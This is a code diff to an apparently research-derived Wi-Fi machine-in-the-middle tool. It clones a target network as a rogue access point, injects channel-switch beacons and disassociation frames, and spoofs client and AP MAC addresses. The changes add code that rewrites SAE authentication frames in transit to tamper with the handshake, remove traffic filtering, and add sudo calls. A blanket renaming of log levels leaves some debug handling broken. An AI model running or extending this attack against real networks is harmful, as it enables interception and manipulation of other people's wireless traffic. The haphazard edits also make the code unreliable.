@@ -50,6 +50,8 @@
 from libwifi import *
 import sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select
 from datetime import datetime
+from logging import *
+from wifi import *
 
 
 #### Packet Processing Functions ####
@@ -134,7 +136,7 @@ def beacon_to_probe_resp(p):
 	return probe_resp/elements/after_tim
 
 
-#### Debug output functions ####
+#### INFO output functions ####
 
 def croprepr(p, length=250):
 	string = repr(p)
@@ -216,7 +218,7 @@ class ClientState():
 	# - Attack_Started: not used by default. In some cases we want to wait until a certain conditions
 	#                   before starting attacks (e.g. waiting after the handshake is completed).
 	# - Attack_Done: not used by default. Can be set after completing an attack, in which
-	#                less debug output about this client will be printed.
+	#                less INFO output about this client will be printed.
 	Initializing, Connecting, GotMitm, Attack_Started, Attack_Done = range(5)
 
 	def state2str(self, state):
@@ -228,6 +230,7 @@ class ClientState():
 	def __init__(self, macaddr):
 		self.macaddr = macaddr
 		self.reset()
+		self.seqNum=85
 
 
 	def reset(self):
@@ -239,7 +242,7 @@ class ClientState():
 
 
 	def update_state(self, state):
-		log(DEBUG, f"Client {self.macaddr} moved to state {self.state2str(state)}", showtime=False)
+		log(INFO, f"Client {self.macaddr} moved to state {self.state2str(state)}", showtime=False)
 		self.state = state
 
 
@@ -250,7 +253,7 @@ class ClientState():
 	def mark_got_mitm(self):
 		if self.state <= ClientState.Connecting:
 			self.update_state(ClientState.GotMitm)
-			log(STATUS, "Established MitM position against client %s" % self.macaddr,
+			log(INFO, "Established MitM position against client %s" % self.macaddr,
 				color="green", showtime=False)
 			return True
 		return False
@@ -266,6 +269,9 @@ class ClientState():
 		be forwarded but not Msg4. The client would then retransmit Msg3 causing a key reinstallation.
 		"""
 
+		# if p.addr1 == self.macaddr and int.from_bytes(bytes(p[Dot11Auth].payload)[:2], "little") == 20:
+		# 	return False
+
 		# By default, everything is forwarded.
 		return True
 
@@ -278,6 +284,14 @@ class ClientState():
 		As an example, in the FragAttacks this function was used to set the A-MSDU flag of
 		selected frames towards the client
 		"""
+		if Dot11Auth in p and p.addr1 == self.macaddr and bytes(p[Dot11Auth].payload)[:2] == b'\x14\x00':
+			p[Dot11Auth] = Dot11Auth(algo=3, seqnum=1, status=77)
+			p /= Raw(load=bytes.fromhex("1400"))
+		elif Dot11Auth in p and p.addr2 == self.macaddr and bytes(p[Dot11Auth].payload)[:2] == b'\x13\x00':
+			modify = bytes(p[Dot11Auth].payload)
+			before = modify[:-4]
+			after = modify[-3:]
+			p[Dot11Auth].payload = Raw(load=(before + b'\x03\x5c\x14'))
 
 		# By default, frames are not modified.
 		return p
@@ -349,13 +363,13 @@ class McMitm():
 			csabeacon = append_csa(beacon, newchannel, 1)
 			self.sock_real.send(csabeacon)
 
-		if not silent: log(STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numpairs, newchannel), color="green")
+		if not silent: log(INFO, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numpairs, newchannel), color="green")
 
 
 	def send_disas(self, macaddr, color="green"):
 		p = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
 		self.sock_rogue.send(p)
-		log(STATUS, "Rogue channel: injected Disassociation to %s" % macaddr, color=color)
+		log(INFO, "Rogue channel: injected Disassociation to %s" % macaddr, color=color)
 
 
 	def queue_disas(self, macaddr):
@@ -372,10 +386,10 @@ class McMitm():
 		if EAPOL in p:
 			print_rx(INFO, prefix, p, suffix=suffix)
 		elif p.type == FRAME_TYPE_DATA and p.subtype in [FRAME_DATA_NULLFUNC, FRAME_DATA_QOSNULL]:
-			print_rx(DEBUG, prefix, p, suffix=suffix)
+			print_rx(INFO, prefix, p, suffix=suffix)
 		elif p.type == FRAME_TYPE_DATA:
 			if self.low_output:
-				level = DEBUG
+				level = INFO
 				if prevtime + 2 < time.time():
 					level = INFO
 					prevtime = time.time()
@@ -383,7 +397,7 @@ class McMitm():
 			else:
 				print_rx(INFO, prefix, p, suffix=suffix)
 		else:
-			print_rx(DEBUG, prefix, p, suffix=suffix)
+			print_rx(INFO, prefix, p, suffix=suffix)
 
 		return prevtime
 
@@ -402,7 +416,7 @@ class McMitm():
 			self.probe_resp.addr1 = p.addr2
 			self.sock_real.send(self.probe_resp)
 			self.display_client_traffic(p, "Rogue channel", prevtime=self.last_print_realchan, suffix=" -- Replied")
-
+			# print("INNN")
 		# 2. Handle frames sent TO the real AP. This is from a client that we haven't
 		#    yet managed to move to the rouge channel.
 		elif p.addr1 == self.apmac:
@@ -469,6 +483,7 @@ class McMitm():
 			#   do this is that the client might have just switched channels, but our script hasn't yet realized
 			#   that it switched channels (i.e. we didn't yet recieve frames received the on rogue channel).
 			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
+			# print(self.clients)
 			# - Group frames: also forward all group frames to the rogue channel that this is requested by the
 			#   user. Otherwise don't forward group frames. FIXME: don't reference args.
 			might_forward = might_forward or (args.group and dot11_is_group(p))
@@ -484,8 +499,9 @@ class McMitm():
 			elif might_forward:
 				print_rx(INFO, "Real channel ", p, suffix=" -- MitM")
 
-			# We did the debug output. Now let's do the actual forwarding.
+			# We did the INFO output. Now let's do the actual forwarding.
 			if might_forward:
+				# print("here")
 				# Note that the client might have meanwhile been deleted (e.g. when forwarding a
 				# deauthentication frame). So we need to check this again.
 				assert p.addr1 in self.clients
@@ -547,7 +563,7 @@ class McMitm():
 				will_forward = client.should_forward(p)
 
 				# Always display Auth, AssoReq, and frames when we're MitM'ing a client.
-				# Otherwise take into account rate limiting of the debug output.
+				# Otherwise take into account rate limiting of the INFO output.
 				if Dot11Auth in p or Dot11AssoReq in p or client.state <= ClientState.Connecting:
 					print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
 					client.mark_got_mitm()
@@ -573,7 +589,7 @@ class McMitm():
 				if p.FCfield & 0x10 != 0 and self.clients[p.addr2].state < ClientState.Attack_Done:
 					log(WARNING, "Client %s is going to sleep while being in the rogue channel. Removing sleep bit." % p.addr2)
 					p.FCfield &= 0xFFEF
-
+				client.modify_packet(p)
 				self.sock_real.send(p)
 
 			# TODO: Inform Linux of the new client / client parameters?
@@ -588,10 +604,10 @@ class McMitm():
 
 	def configure_interfaces(self):
 		# 0. Warn about common mistakes
-		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")
+		log(INFO, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")
 		# This happens when targetting a specific client: both interfaces will ACK frames from each other due to the capture
 		# effect, meaning certain frames will not reach the rogue AP or the client. As a result, the client will disconnect.
-		log(STATUS, "Note: keep >1 meter between interfaces. Else packet delivery is unreliable & target may disconnect")
+		log(INFO, "Note: keep >1 meter between interfaces. Else packet delivery is unreliable & target may disconnect")
 
 		# 1. Remove unused virtual interfaces (they might still be broadcasting after an improper exit)
 		subprocess.call(["iw", self.nic_real_ap, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -635,7 +651,7 @@ class McMitm():
 		# capture and inject packets in monitor mode.
 		subprocess.check_output(["ifconfig", self.nic_real_mon, "up"])
 		self.sock_real  = MonitorSocket(type=ETH_P_ALL, iface=self.nic_real_mon , dumpfile=self.dumpfile, detect_injected=self.strict_echo_test)
-		log(STATUS, f"Monitor mode: using {self.nic_real_mon} on real channel and {self.nic_rogue_mon} on rogue channel.")
+		log(INFO, f"Monitor mode: using {self.nic_real_mon} on real channel and {self.nic_rogue_mon} on rogue channel.")
 
 		# Test monitor mode and get MAC address of the network
 		# FIXME: Add an option to find the network based on the MAC address of the network
@@ -655,44 +671,45 @@ class McMitm():
 		self.beacon[Dot11EltDSSSet].channel = self.netconfig.rogue_channel
 		self.probe_resp = beacon_to_probe_resp(self.beacon)
 
-		log(STATUS, f"Target network {self.apmac} detected on channel {self.netconfig.real_channel}", color="green")
-		log(STATUS, f"Will use {self.nic_rogue_ap} to create rogue AP on channel {self.netconfig.rogue_channel}")
+		log(INFO, f"Target network {self.apmac} detected on channel {self.netconfig.real_channel}", color="green")
+		log(INFO, f"Will use {self.nic_rogue_ap} to create rogue AP on channel {self.netconfig.rogue_channel}")
 
 		# Now that we know the channel of the AP, put the monitor mode in active ACK mode (might start an AP)
 		if start_nic_real_ap:
-			subprocess.check_output(["iw", self.nic_real_mon, "interface", "add", self.nic_real_ap, "type", "__ap"])
-			log(STATUS, f"Setting MAC address of {self.nic_real_ap} to {self.clientmac}")
+			subprocess.check_output(["sudo", "iw", self.nic_real_mon, "interface", "add", self.nic_real_ap, "type", "__ap"])
+			log(INFO, f"Setting MAC address of {self.nic_real_ap} to {self.clientmac}")
 			set_macaddress(self.nic_real_ap, self.clientmac)
 			# Note: at least for ath9k_htc and rt2800usb the MAC address used in the
 			#       beacon doesn't influence ACK / retransmission behaviour. For that
 			#       behaviour it uses the configured MAC address of the interface.
 			start_ap(self.nic_real_ap, self.netconfig.real_channel, self.beacon)
 		else:
-			log(STATUS, f"Setting MAC address of {self.nic_real_mon} to {self.clientmac}")
+			log(INFO, f"Setting MAC address of {self.nic_real_mon} to {self.clientmac}")
 			set_macaddress(self.nic_real_mon, self.clientmac)
 
 		#
 		# 3. Set up the rogue AP and interfaces
 		#
 
-		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
+		log(INFO, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
 		set_macaddress(self.nic_rogue_ap, self.apmac)
 
-		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
+		subprocess.check_output(["sudo", "ifconfig", self.nic_rogue_mon, "up"])
 		self.sock_rogue = MonitorSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile, detect_injected=self.strict_echo_test)
 
 		# Set BFP filters to increase performance
-		bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
-		if self.clientmac:
-			bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
-		bpf = "(wlan type data or wlan type mgt) and (%s)" % bpf
+		# bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
+		# if self.clientmac:
+		# 	bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
+		bpf = "" 
+		# "(wlan type data or wlan type mgt) and (%s)" % bpf
 		self.sock_real.attach_filter(bpf)
 		self.sock_rogue.attach_filter(bpf)
 
 		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to
 		# manually use the generated config).
 		start_ap(self.nic_rogue_ap, self.netconfig.rogue_channel, self.beacon)
-		log(STATUS, "Giving the rogue AP one second to initialize ...")
+		log(INFO, "Giving the rogue AP one second to initialize ...")
 		time.sleep(1)
 
 		#
@@ -733,7 +750,7 @@ class McMitm():
 
 
 	def stop(self):
-		log(STATUS, "Cleaning up ...")
+		log(INFO, "Cleaning up ...")
 		if self.sock_real: self.sock_real.close()
 		if self.sock_rogue: self.sock_rogue.close()
 
@@ -748,7 +765,7 @@ if __name__ == "__main__":
 	parser.add_argument("ssid", help="The SSID of the network to attack.")
 	parser.add_argument("-t", "--target", help="Specifically target the client with the given MAC address.")
 	parser.add_argument("-p", "--dump", help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
-	parser.add_argument("-d", "--debug", action="count", help="increase output verbosity", default=0)
+	parser.add_argument("-d", "--INFO", action="count", help="increase output verbosity", default=0)
 	parser.add_argument("--strict-echo-test", help="Never treat frames received from the air as echoed injected frames", action='store_true')
 	parser.add_argument("--continuous-csa", help="Continuously send CSA beacons on the real channel (10 CSAs/second)", action='store_true')
 	parser.add_argument("--reduce-output", default=False, help="Only display new data frames every 2 seconds", action='store_true')
@@ -759,7 +776,7 @@ if __name__ == "__main__":
 	if args.target:
 		args.target = args.target.lower()
 
-	change_log_level(-args.debug)
+	# change_log_level(-args.INFO)
 
 	attack = McMitm(args.nic_real, args.nic_rogue, args.ssid, args.target, args.dump,
 			args.continuous_csa, args.reduce_output, args.strict_echo_test)
